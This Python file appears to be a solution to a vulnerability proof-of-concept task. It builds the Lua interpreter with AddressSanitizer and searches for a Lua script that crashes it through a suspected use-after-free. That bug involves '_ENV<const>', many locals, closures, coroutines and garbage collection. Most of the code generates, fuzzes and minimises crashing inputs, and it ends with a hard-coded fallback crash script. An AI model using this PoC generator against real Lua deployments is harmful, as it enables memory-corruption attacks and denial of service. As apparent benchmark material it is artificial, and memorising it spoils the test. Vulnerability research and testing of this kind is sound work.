import os
import re
import tarfile
import tempfile
import subprocess
import shutil
import time
import random
from typing import List, Optional, Tuple


class Solution:
    def _safe_extract_tar(self, tar_path: str, dst_dir: str) -> str:
        with tarfile.open(tar_path, "r:*") as tf:
            base = os.path.realpath(dst_dir) + os.sep
            for m in tf.getmembers():
                name = m.name
                if not name or name.startswith("/") or name.startswith("\\"):
                    continue
                out_path = os.path.realpath(os.path.join(dst_dir, name))
                if not out_path.startswith(base):
                    continue
                try:
                    tf.extract(m, dst_dir)
                except Exception:
                    pass

        entries = []
        try:
            entries = [os.path.join(dst_dir, x) for x in os.listdir(dst_dir)]
        except Exception:
            return dst_dir
        dirs = [p for p in entries if os.path.isdir(p)]
        files = [p for p in entries if os.path.isfile(p)]
        if len(dirs) == 1 and not files:
            return dirs[0]
        return dst_dir

    def _run(self, cmd: List[str], cwd: Optional[str] = None, env: Optional[dict] = None, timeout: int = 300) -> Tuple[int, bytes, bytes]:
        try:
            p = subprocess.run(
                cmd,
                cwd=cwd,
                env=env,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                check=False,
            )
            return p.returncode, p.stdout, p.stderr
        except subprocess.TimeoutExpired as e:
            out = e.stdout or b""
            err = e.stderr or b""
            return 124, out, err
        except Exception as e:
            return 127, b"", (str(e).encode("utf-8", "ignore") + b"\n")

    def _find_lua_src_dir(self, root: str) -> Optional[str]:
        candidates = []
        for dirpath, dirnames, filenames in os.walk(root):
            fn = set(filenames)
            if "lua.c" in fn and "lapi.c" in fn and "lstate.c" in fn:
                candidates.append(dirpath)
        if not candidates:
            return None
        candidates.sort(key=lambda p: (p.count(os.sep), len(p)))
        return candidates[0]

    def _find_exe(self, root: str) -> Optional[str]:
        direct = [
            os.path.join(root, "src", "lua"),
            os.path.join(root, "lua"),
            os.path.join(root, "bin", "lua"),
            os.path.join(root, "src", "lua.exe"),
            os.path.join(root, "lua.exe"),
        ]
        for p in direct:
            if os.path.isfile(p) and os.access(p, os.X_OK):
                return p
        for dirpath, dirnames, filenames in os.walk(root):
            if "lua" in filenames:
                p = os.path.join(dirpath, "lua")
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    return p
            if "lua.exe" in filenames:
                p = os.path.join(dirpath, "lua.exe")
                if os.path.isfile(p) and os.access(p, os.X_OK):
                    return p
        return None

    def _build_with_make(self, root: str, env: dict, deadline: float) -> Optional[str]:
        make = shutil.which("make")
        if not make:
            return None

        for cwd in [root, os.path.join(root, "src")]:
            if not os.path.isdir(cwd):
                continue
            if time.monotonic() > deadline:
                break
            for target in ["posix", "generic", "linux", "all"]:
                if time.monotonic() > deadline:
                    break
                rc, out, err = self._run([make, "-j8", target], cwd=cwd, env=env, timeout=max(1, int(deadline - time.monotonic())))
                exe = self._find_exe(root)
                if exe:
                    return exe
        return None

    def _build_manual(self, root: str, env: dict, deadline: float) -> Optional[str]:
        srcdir = self._find_lua_src_dir(root)
        if not srcdir:
            return None

        cc = env.get("CC") or shutil.which("clang") or shutil.which("gcc") or shutil.which("cc")
        if not cc:
            return None

        builddir = os.path.join(root, "_poc_build")
        os.makedirs(builddir, exist_ok=True)
        out_exe = os.path.join(builddir, "lua_poc")

        cflags = env.get("CFLAGS", "")
        ldflags = env.get("LDFLAGS", "")
        sysdefs = "-DLUA_USE_POSIX -DLUA_USE_DLOPEN"

        core = [
            "lapi.c", "lcode.c", "lctype.c", "ldebug.c", "ldo.c", "ldump.c", "lfunc.c", "lgc.c", "llex.c",
            "lmem.c", "lobject.c", "lopcodes.c", "lparser.c", "lstate.c", "lstring.c", "ltable.c", "ltm.c",
            "lundump.c", "lvm.c", "lzio.c"
        ]
        libs = [
            "lauxlib.c", "lbaselib.c", "lcorolib.c", "ldblib.c", "liolib.c", "lmathlib.c", "loadlib.c",
            "loslib.c", "lstrlib.c", "ltablib.c", "lutf8lib.c", "linit.c"
        ]
        main = ["lua.c"]

        def existing(files: List[str]) -> List[str]:
            out = []
            for f in files:
                p = os.path.join(srcdir, f)
                if os.path.isfile(p):
                    out.append(p)
            return out

        sources = existing(core) + existing(libs) + existing(main)
        if not sources:
            return None

        objs = []
        for sp in sources:
            if time.monotonic() > deadline:
                return None
            bn = os.path.basename(sp)
            op = os.path.join(builddir, bn[:-2] + ".o")
            cmd = [cc, "-c", sp, "-o", op] + sysdefs.split()
            if cflags:
                cmd += cflags.split()
            rc, out, err = self._run(cmd, cwd=srcdir, env=env, timeout=max(1, int(deadline - time.monotonic())))
            if rc != 0 or not os.path.isfile(op):
                return None
            objs.append(op)

        if time.monotonic() > deadline:
            return None
        cmd = [cc, "-o", out_exe] + objs
        if ldflags:
            cmd += ldflags.split()
        cmd += ["-lm", "-ldl"]
        rc, out, err = self._run(cmd, cwd=srcdir, env=env, timeout=max(1, int(deadline - time.monotonic())))
        if rc == 0 and os.path.isfile(out_exe):
            os.chmod(out_exe, 0o755)
            return out_exe
        return None

    def _build_lua(self, root: str, deadline: float) -> Optional[str]:
        env = os.environ.copy()
        cc = shutil.which("clang") or shutil.which("gcc") or shutil.which("cc")
        if cc:
            env["CC"] = cc

        # Prefer ASan for detection during local search
        san = "-O1 -g -fno-omit-frame-pointer -fsanitize=address"
        # Some environments don't have ubsan runtime available; keep it simple
        env["MYCFLAGS"] = (env.get("MYCFLAGS", "") + " " + san + " -DLUA_USE_POSIX -DLUA_USE_DLOPEN").strip()
        env["MYLDFLAGS"] = (env.get("MYLDFLAGS", "") + " " + san).strip()
        env["CFLAGS"] = (env.get("CFLAGS", "") + " " + san + " -DLUA_USE_POSIX -DLUA_USE_DLOPEN").strip()
        env["LDFLAGS"] = (env.get("LDFLAGS", "") + " " + san).strip()
        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "") + ":abort_on_error=1:detect_leaks=0:allocator_may_return_null=1"
        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "") + ":print_stacktrace=1"

        exe = self._build_with_make(root, env, deadline)
        if exe:
            return exe
        exe = self._build_manual(root, env, deadline)
        return exe

    def _is_sanitizer_crash(self, rc: int, stderr: bytes) -> bool:
        if rc == 0:
            return False
        s = stderr.decode("utf-8", "ignore")
        if "AddressSanitizer" in s or "ERROR: AddressSanitizer" in s:
            return True
        if "heap-use-after-free" in s or "use-after-free" in s:
            return True
        if "Sanitizer" in s and ("ERROR" in s or "runtime error" in s):
            return True
        # allow plain crash signals
        if rc < 0:
            return True
        return False

    def _run_lua_code(self, lua_exe: str, code: bytes, timeout: float = 2.5) -> Tuple[int, bytes, bytes]:
        env = os.environ.copy()
        env["ASAN_OPTIONS"] = env.get("ASAN_OPTIONS", "") + ":abort_on_error=1:detect_leaks=0:allocator_may_return_null=1"
        env["UBSAN_OPTIONS"] = env.get("UBSAN_OPTIONS", "") + ":print_stacktrace=1"
        try:
            p = subprocess.run(
                [lua_exe, "-"],
                input=code,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
                env=env,
                check=False,
            )
            return p.returncode, p.stdout, p.stderr
        except subprocess.TimeoutExpired as e:
            return 124, e.stdout or b"", e.stderr or b""

    def _names_two_letter(self, n: int) -> List[str]:
        alpha = "abcdefghijklmnopqrstuvwxyz"
        out = []
        for i in range(n):
            out.append(alpha[(i // 26) % 26] + alpha[i % 26])
        return out

    def _tmpl_make_locals(self, n: int, include_gc: bool = True, include_stack_grow: bool = False, m: int = 0, coroutine_wrap: bool = False) -> bytes:
        names = self._names_two_letter(n)
        locals_decl = "local " + ",".join(names)
        # keep x in env so closure returns number without error
        make = "local function m()local _ENV<const>={};" + locals_decl + ";x=1;return function()return x end end;"
        if coroutine_wrap:
            # create in coroutine to stress close-upvalues paths
            pre = "local co=coroutine.create(function()return m()end);local _,f=coroutine.resume(co);co=nil;"
        else:
            pre = "local f=m();"
        grow = ""
        if include_stack_grow and m > 0:
            bn = self._names_two_letter(m)
            grow = "local function g()local " + ",".join(bn) + ";return 0 end;g();"
        gc = "collectgarbage();" if include_gc else ""
        post = "f();"
        if coroutine_wrap:
            post = "if f then f() end;"
        code = make + pre + grow + gc + post
        return code.encode("utf-8")

    def _find_crashing_poc(self, lua_exe: str, deadline: float) -> Optional[bytes]:
        best = None

        def test(code: bytes) -> bool:
            rc, out, err = self._run_lua_code(lua_exe, code, timeout=2.5)
            return self._is_sanitizer_crash(rc, err)

        # Try structured candidates first
        base_candidates = []
        for n in [200, 180, 160, 140, 120, 100]:
            base_candidates.append(("plain", n, False, 0, False))
            base_candidates.append(("gc", n, False, 0, False))
            base_candidates.append(("grow", n, True, 200, False))
            base_candidates.append(("co", n, False, 0, True))
            base_candidates.append(("co_grow", n, True, 200, True))

        for kind, n, do_grow, m, co in base_candidates:
            if time.monotonic() > deadline:
                break
            code = self._tmpl_make_locals(n=n, include_gc=True, include_stack_grow=do_grow, m=m, coroutine_wrap=co)
            if test(code):
                best = code if best is None or len(code) < len(best) else best
                # attempt to minimize n (assume monotone-ish; quick binary search)
                lo, hi = 1, n
                cur_best_n = n
                while lo <= hi and time.monotonic() <= deadline:
                    mid = (lo + hi) // 2
                    mid_code = self._tmpl_make_locals(n=mid, include_gc=True, include_stack_grow=do_grow, m=m, coroutine_wrap=co)
                    if test(mid_code):
                        cur_best_n = mid
                        best = mid_code if best is None or len(mid_code) < len(best) else best
                        hi = mid - 1
                    else:
                        lo = mid + 1
                # try dropping stack-grow or gc if present
                if do_grow:
                    drop_grow = self._tmpl_make_locals(n=cur_best_n, include_gc=True, include_stack_grow=False, m=0, coroutine_wrap=co)
                    if test(drop_grow):
                        best = drop_grow if best is None or len(drop_grow) < len(best) else best
                drop_gc = self._tmpl_make_locals(n=cur_best_n, include_gc=False, include_stack_grow=do_grow, m=m, coroutine_wrap=co)
                if test(drop_gc):
                    best = drop_gc if best is None or len(drop_gc) < len(best) else best
                return best

        # Light fuzz around parameters
        rng = random.Random(0x44597)
        start = time.monotonic()
        tries = 0
        while time.monotonic() <= deadline and tries < 120:
            tries += 1
            n = rng.randint(80, 200)
            do_grow = rng.random() < 0.6
            m = rng.randint(80, 200) if do_grow else 0
            co = rng.random() < 0.5
            include_gc = rng.random() < 0.9
            code = self._tmpl_make_locals(n=n, include_gc=include_gc, include_stack_grow=do_grow, m=m, coroutine_wrap=co)
            if test(code):
                if best is None or len(code) < len(best):
                    best = code
                return best

        return best

    def solve(self, src_path: str) -> bytes:
        start = time.monotonic()
        deadline = start + 55.0

        with tempfile.TemporaryDirectory() as td:
            root = self._safe_extract_tar(src_path, td)

            lua_exe = self._build_lua(root, deadline=deadline)
            if lua_exe and time.monotonic() <= deadline:
                poc = self._find_crashing_poc(lua_exe, deadline=deadline)
                if poc:
                    return poc

        # Fallback deterministic PoC guess (no local validation possible)
        # Uses _ENV<const> + maximal locals to stress compiler/register allocation paths.
        n = 200
        alpha = "abcdefghijklmnopqrstuvwxyz"
        names = []
        for i in range(n):
            names.append(alpha[(i // 26) % 26] + alpha[i % 26])
        locals_decl = "local " + ",".join(names)
        code = (
            "local function m()local _ENV<const>={};" +
            locals_decl +
            ";x=1;return function()return x end end;" +
            "local f=m();collectgarbage();f();"
        )
        return code.encode("utf-8")